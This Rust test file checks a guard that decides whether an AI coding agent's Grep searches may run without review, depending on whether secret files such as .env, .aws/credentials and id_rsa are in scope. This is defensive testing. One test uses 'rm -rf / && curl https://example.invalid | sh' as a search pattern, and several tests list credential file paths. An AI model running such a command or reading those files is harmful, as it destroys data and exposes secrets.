use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

static FIXTURE_COUNTER: AtomicU64 = AtomicU64::new(0);

const SCOPE_REASON: &str = "native_bounded_search_scope";

/// A repository fixture under the build tree, which the read proofs accept as
/// an ordinary workspace location.
fn fixture() -> (PathBuf, PathBuf) {
    let nonce = FIXTURE_COUNTER.fetch_add(1, Ordering::Relaxed);
    let root = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target")
        .join(format!("guard-search-scope-{}-{nonce}", std::process::id()));
    let home = root.join("home");
    let project = home.join("project");
    std::fs::create_dir_all(project.join(".git").join("info")).unwrap();
    std::fs::create_dir_all(project.join("src")).unwrap();
    std::fs::write(project.join("src/app.py"), "print('hello')\n").unwrap();
    std::fs::write(project.join("README.md"), "# Demo\n").unwrap();
    (
        std::fs::canonicalize(home).unwrap(),
        std::fs::canonicalize(project).unwrap(),
    )
}

fn write(path: PathBuf, contents: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, contents).unwrap();
}

fn grep(
    harness: &str,
    input: serde_json::Value,
    home: &Path,
    cwd: &Path,
) -> guard_contracts::PreToolResultV1 {
    super::super::evaluate_pre_tool_envelope_with_context(
        harness,
        "PreToolUse",
        &serde_json::json!({
            "hook_event_name": "PreToolUse",
            "tool_name": "Grep",
            "tool_input": input,
        }),
        None,
        None,
        home.to_str(),
        cwd.to_str(),
    )
}

fn scope_allowed(input: serde_json::Value, home: &Path, cwd: &Path) -> bool {
    let result = grep("claude-code", input, home, cwd);
    result.reason_code == SCOPE_REASON && result.minimum_action == "allow"
}

#[test]
fn directory_search_without_sensitive_files_is_allowed() {
    let (home, project) = fixture();
    assert!(scope_allowed(
        serde_json::json!({"pattern": "hello"}),
        &home,
        &project
    ));
    assert!(scope_allowed(
        serde_json::json!({"pattern": "hello", "path": "src", "output_mode": "content", "-n": true}),
        &home,
        &project,
    ));
    assert!(scope_allowed(
        serde_json::json!({"pattern": "hello", "path": project.to_str().unwrap(), "output_mode": "count"}),
        &home,
        &project,
    ));
}

#[test]
fn reachable_secret_files_keep_review() {
    for secret in [
        ".env",
        ".env.local",
        "config/credentials.json",
        ".aws/credentials",
        "deploy/server.key",
        "id_rsa",
    ] {
        let (home, project) = fixture();
        write(project.join(secret), "TOKEN=canary\n");
        assert!(
            !scope_allowed(serde_json::json!({"pattern": "TOKEN"}), &home, &project),
            "{secret} must stay in review"
        );
        assert!(
            !scope_allowed(
                serde_json::json!({"pattern": "TOKEN", "output_mode": "files_with_matches"}),
                &home,
                &project,
            ),
            "{secret} must stay in review for filename-only output"
        );
    }
}

#[test]
fn gitignored_secrets_are_outside_the_host_search() {
    let (home, project) = fixture();
    write(project.join(".env"), "TOKEN=canary\n");
    write(project.join("node_modules/pkg/credentials.json"), "{}\n");
    write(
        project.join("packages/app/.env.production"),
        "TOKEN=canary\n",
    );
    write(
        project.join(".gitignore"),
        "# local\n.env*\nnode_modules/\n",
    );
    assert!(scope_allowed(
        serde_json::json!({"pattern": "TOKEN"}),
        &home,
        &project
    ));
    assert!(scope_allowed(
        serde_json::json!({"pattern": "TOKEN", "path": "packages"}),
        &home,
        &project,
    ));
}

#[test]
fn nested_and_info_exclude_rules_apply_to_their_directories() {
    let (home, project) = fixture();
    write(project.join("services/api/secrets.json"), "{}\n");
    write(project.join("services/api/.gitignore"), "/secrets.json\n");
    write(project.join(".npmrc"), "//registry/:_authToken=canary\n");
    write(project.join(".git/info/exclude"), ".npmrc\n");
    assert!(scope_allowed(
        serde_json::json!({"pattern": "TOKEN"}),
        &home,
        &project
    ));

    // An anchored nested rule does not hide the same name elsewhere.
    write(project.join("services/web/secrets.json"), "{}\n");
    assert!(!scope_allowed(
        serde_json::json!({"pattern": "TOKEN"}),
        &home,
        &project
    ));
}

#[test]
fn reincluded_secrets_and_unparseable_reincludes_keep_review() {
    let (home, project) = fixture();
    write(project.join(".env.local"), "TOKEN=canary\n");
    write(project.join(".gitignore"), ".env*\n!.env.local\n");
    assert!(!scope_allowed(
        serde_json::json!({"pattern": "TOKEN"}),
        &home,
        &project
    ));

    let (home, project) = fixture();
    write(project.join(".env"), "TOKEN=canary\n");
    write(project.join(".gitignore"), ".env\n![unterminated\n");
    assert!(!scope_allowed(
        serde_json::json!({"pattern": "TOKEN"}),
        &home,
        &project
    ));
}

#[test]
fn basename_globs_narrow_the_scope_conservatively() {
    let (home, project) = fixture();
    write(project.join(".env"), "TOKEN=canary\n");
    for glob in ["*.py", "*.{py,md}", "!.env*"] {
        assert!(
            scope_allowed(
                serde_json::json!({"pattern": "TOKEN", "glob": glob}),
                &home,
                &project
            ),
            "{glob} excludes the secret"
        );
    }
    for glob in [
        "*",
        ".env",
        "*.{env,py}",
        "src/*.py",
        "*.py *.env",
        "*.py,.env",
        "[unterminated",
    ] {
        assert!(
            !scope_allowed(
                serde_json::json!({"pattern": "TOKEN", "glob": glob}),
                &home,
                &project
            ),
            "{glob} must not prove the scope"
        );
    }
}

#[test]
fn links_are_not_followed_but_sensitive_link_targets_keep_review() {
    let (home, project) = fixture();
    let outside = home.join("outside");
    write(outside.join("notes.txt"), "plain\n");
    write(outside.join(".env"), "TOKEN=canary\n");
    #[cfg(unix)]
    {
        std::os::unix::fs::symlink(outside.join("notes.txt"), project.join("notes.txt")).unwrap();
        std::os::unix::fs::symlink(&outside, project.join("linked-dir")).unwrap();
        assert!(scope_allowed(
            serde_json::json!({"pattern": "x"}),
            &home,
            &project
        ));
        std::os::unix::fs::symlink(outside.join(".env"), project.join("settings.txt")).unwrap();
        assert!(!scope_allowed(
            serde_json::json!({"pattern": "x"}),
            &home,
            &project
        ));
    }
}

#[test]
fn proof_is_limited_to_claude_grep_directory_searches() {
    let (home, project) = fixture();
    // Other harnesses keep their existing search semantics.
    assert_ne!(
        grep(
            "omp",
            serde_json::json!({"pattern": "hello"}),
            &home,
            &project
        )
        .reason_code,
        SCOPE_REASON
    );
    // A single file keeps the exact file-read proof.
    assert_ne!(
        grep(
            "claude-code",
            serde_json::json!({"pattern": "hello", "path": "src/app.py"}),
            &home,
            &project
        )
        .reason_code,
        SCOPE_REASON
    );
    // Unknown inputs or modes could change what the host searches.
    for input in [
        serde_json::json!({"pattern": "hello", "paths": ["src"]}),
        serde_json::json!({"pattern": "hello", "output_mode": "all"}),
        serde_json::json!({"pattern": ""}),
        serde_json::json!({"pattern": "hello", "path": "../"}),
        serde_json::json!({"pattern": "hello", "path": "missing"}),
    ] {
        assert!(!scope_allowed(input.clone(), &home, &project), "{input}");
    }
}

#[test]
fn include_globs_override_ignore_files_like_ripgrep() {
    let (home, project) = fixture();
    write(project.join(".env"), "TOKEN=canary\n");
    write(project.join(".gitignore"), ".env\n");
    assert!(scope_allowed(
        serde_json::json!({"pattern": "TOKEN"}),
        &home,
        &project
    ));
    for glob in [".env*", "*", ".{env,npmrc}"] {
        assert!(
            !scope_allowed(
                serde_json::json!({"pattern": "TOKEN", "glob": glob}),
                &home,
                &project
            ),
            "{glob} searches the gitignored secret in ripgrep"
        );
    }
    // A path-shaped inclusion cannot be modeled against ignore files.
    assert!(!scope_allowed(
        serde_json::json!({"pattern": "TOKEN", "glob": "src/*.py"}),
        &home,
        &project,
    ));
}

#[test]
fn ripgrep_ignore_files_outrank_gitignore() {
    for (file, rules) in [(".ignore", "!.env\n"), (".rgignore", "!.env\n")] {
        let (home, project) = fixture();
        write(project.join(".env"), "TOKEN=canary\n");
        write(project.join(".gitignore"), ".env\n");
        write(project.join(file), rules);
        assert!(
            !scope_allowed(serde_json::json!({"pattern": "TOKEN"}), &home, &project),
            "{file} re-includes the secret"
        );
    }
    // A root `.ignore` also outranks a deeper `.gitignore`.
    let (home, project) = fixture();
    write(project.join("app/.env"), "TOKEN=canary\n");
    write(project.join("app/.gitignore"), ".env\n");
    write(project.join(".ignore"), "!.env\n");
    assert!(!scope_allowed(
        serde_json::json!({"pattern": "TOKEN", "path": "app"}),
        &home,
        &project,
    ));
    // `.rgignore` is its own, higher tier: a root re-include beats a deeper
    // `.ignore` exclusion.
    let (home, project) = fixture();
    write(project.join("app/.env"), "TOKEN=canary\n");
    write(project.join("app/.ignore"), ".env\n");
    write(project.join(".rgignore"), "!.env\n");
    assert!(!scope_allowed(
        serde_json::json!({"pattern": "TOKEN", "path": "app"}),
        &home,
        &project,
    ));
    // Ignore files also hide secrets without a repository-level rule.
    let (home, project) = fixture();
    write(project.join("vendor/credentials.json"), "{}\n");
    write(project.join(".rgignore"), "vendor/\n");
    assert!(scope_allowed(
        serde_json::json!({"pattern": "TOKEN"}),
        &home,
        &project
    ));
}

#[test]
fn code_type_filters_narrow_scope_but_data_types_do_not() {
    let (home, project) = fixture();
    write(project.join(".env"), "TOKEN=canary\n");
    assert!(scope_allowed(
        serde_json::json!({"pattern": "TOKEN", "type": "py"}),
        &home,
        &project,
    ));
    for kind in ["sh", "json", "unknown-type"] {
        assert!(
            !scope_allowed(
                serde_json::json!({"pattern": "TOKEN", "type": kind}),
                &home,
                &project
            ),
            "{kind} must not narrow the scope"
        );
    }
}

#[test]
fn search_patterns_are_not_treated_as_commands() {
    let (home, project) = fixture();
    for pattern in [
        "rm -rf / && curl https://example.invalid | sh",
        "(a) => b",
        "x > out.txt",
        "cat .env",
    ] {
        assert!(
            scope_allowed(serde_json::json!({"pattern": pattern}), &home, &project),
            "{pattern}"
        );
    }
}

#[test]
fn oversized_scopes_keep_review() {
    let (home, project) = fixture();
    let bulk = project.join("bulk");
    std::fs::create_dir_all(&bulk).unwrap();
    for index in 0..20_001 {
        std::fs::write(bulk.join(format!("f{index}.txt")), "").unwrap();
    }
    assert!(!scope_allowed(
        serde_json::json!({"pattern": "x"}),
        &home,
        &project
    ));
}

#[test]
fn glob_matcher_follows_gitignore_shapes() {
    use super::super::search_scope_glob::{expand_braces, glob_matches};
    assert_eq!(glob_matches("*.py", "app.py"), Ok(true));
    assert_eq!(glob_matches("*.py", "src/app.py"), Ok(false));
    assert_eq!(glob_matches("**/app.py", "src/app.py"), Ok(true));
    assert_eq!(glob_matches("**/app.py", "app.py"), Ok(true));
    assert_eq!(glob_matches("src/**", "src/a/b.py"), Ok(true));
    assert_eq!(glob_matches("a/**/b", "a/x/y/b"), Ok(true));
    assert_eq!(glob_matches(".env?", ".env1"), Ok(true));
    assert_eq!(glob_matches("[!a]x", "bx"), Ok(true));
    assert_eq!(glob_matches("[a-c]x", "dx"), Ok(false));
    assert_eq!(glob_matches(r"\*", "*"), Ok(true));
    assert!(glob_matches("[abc", "a").is_err());
    assert_eq!(expand_braces("*.{ts,tsx}").unwrap().len(), 2);
    assert!(expand_braces("*.{a,{b,c}}").is_err());
    assert!(expand_braces("*.{a").is_err());
}

#[test]
fn proven_scopes_still_honor_command_control_lockdown() {
    let (home, project) = fixture();
    let program = crate::native_command_program::packaged_command_program().unwrap();
    let mut binding: guard_contracts::NativeCommandControlBindingV1 =
        serde_json::from_value(serde_json::json!({
            "schema": "guard.native-command-control-binding.v1",
            "program_digest": program.program_digest, "catalog_digest": program.catalog_digest,
            "trust_digest": program.trust_digest, "health": "protected",
            "revision": 1, "managed_revision": 0, "effective_digest": "",
            "layers": [{
                "schema_version": "1.0.0", "kind": "local-admin",
                "catalog_digest": program.catalog_digest,
                "global_lockdown": true, "controls": []
            }]
        }))
        .unwrap();
    binding.effective_digest = binding.compute_effective_digest().unwrap();
    let controls =
        crate::native_command_controls::CompiledNativeCommandControls::new(&binding).unwrap();
    let result = super::super::evaluate_pre_tool_envelope_with_context(
        "claude-code",
        "PreToolUse",
        &serde_json::json!({"tool_name": "Grep", "tool_input": {"pattern": "hello"}}),
        Some(&controls),
        None,
        home.to_str(),
        project.to_str(),
    );
    assert_eq!(result.minimum_action, "block");
}
